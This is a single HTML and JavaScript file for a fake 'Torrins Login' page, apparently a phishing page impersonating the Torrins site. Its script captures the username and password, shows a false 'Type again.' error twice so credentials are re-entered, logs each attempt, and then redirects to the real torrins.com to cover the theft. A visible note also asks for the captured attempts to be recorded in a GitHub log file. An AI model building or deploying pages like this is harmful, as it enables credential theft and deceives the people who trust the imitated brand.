<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Torrins Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center h-screen">
    <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
        <h2 class="text-2xl font-bold mb-6 text-center">Torrins Login</h2>
        <div id="error-message" class="text-red-500 text-center mb-4 hidden"></div>
        <form id="login-form" onsubmit="handleSubmit(event)">
            <div class="mb-4">
                <label for="username" class="block text-sm font-medium text-gray-700">Username</label>
                <input type="text" id="username" name="username" class="mt-1 p-2 w-full border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" required>
            </div>
            <div class="mb-4">
                <label for="password" class="block text-sm font-medium text-gray-700">Password</label>
                <input type="password" id="password" name="password" class="mt-1 p-2 w-full border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" required>
            </div>
            <button type="submit" class="w-full bg-blue-500 text-white p-2 rounded-md hover:bg-blue-600">Login</button>
        </form>
        <p class="mt-4 text-center text-sm text-gray-600">Submissions: <span id="submissions">0</span>/3</p>
        <div id="manual-update-instructions" class="mt-6 text-center text-sm text-gray-600">
            <p>After each failed login attempt, please manually update the <a href="https://github.com/yourusername/your-repo/blob/main/custom.log" target="_blank">custom.log file</a> on GitHub with the attempt details.</p>
        </div>
    </div>
    <script>
        let submissions = 0;

        function handleSubmit(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const errorMessage = document.getElementById('error-message');
            const submissionsDisplay = document.getElementById('submissions');

            // Increment submission count
            submissions++;
            submissionsDisplay.textContent = submissions.toString();

            // Show error message based on submission count
            if (submissions < 3) {
                errorMessage.textContent = 'Type again.';
                errorMessage.classList.remove('hidden');
                document.getElementById('password').value = ''; // Clear password field
            } else {
                errorMessage.textContent = 'Final submission received. Redirecting...';
                errorMessage.classList.remove('hidden');
                setTimeout(() => {
                    window.location.href = 'https://www.torrins.com/';
                }, 2000);
            }

            // Log the attempt to console for demonstration purposes
            console.log(`Attempt ${submissions}: Username: ${username}, Password: ${password}`);
        }
    </script>
</body>
</html>
